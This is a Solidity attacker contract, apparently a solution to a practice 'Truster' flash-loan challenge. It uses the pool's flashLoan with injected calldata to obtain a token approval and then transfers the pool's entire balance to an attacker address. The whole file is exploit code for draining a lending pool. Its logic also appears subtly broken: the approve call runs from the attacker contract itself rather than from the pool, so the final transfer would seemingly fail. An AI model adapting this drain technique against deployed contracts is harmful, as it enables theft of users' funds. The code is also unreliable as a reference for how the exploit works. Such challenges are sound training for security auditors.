// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../truster/TrusterLenderPool.sol";
import "hardhat/console.sol";
import "@openzeppelin/contracts/utils/Address.sol";


contract TrustAttacker{

    using Address for address;

    IERC20 public immutable token;
    TrusterLenderPool public pool;
    address public attacker;

    constructor(address _pool, address _attacker, address _token){
        token = IERC20(_token);
        pool = TrusterLenderPool(_pool);
        attacker = _attacker;
    }

    function CallFlashLoan() external{
        uint256 poolBalance = token.balanceOf(address(pool));
       // bytes memory approvePayload = abi.encodeWithSignature("approve(address,uint256)", address(this), poolBalance);
        pool.flashLoan(0, address(this), address(this), abi.encodeWithSignature("calledFunc(address,uint256)", address(this), poolBalance));
        token.transferFrom(address(pool), attacker, poolBalance);
    }

    function calledFunc(address myaddress, uint256 poolBalance) external{
        console.log(address(token));
        token.approve(myaddress, poolBalance);
    }

    receive() external payable{
        
    }
}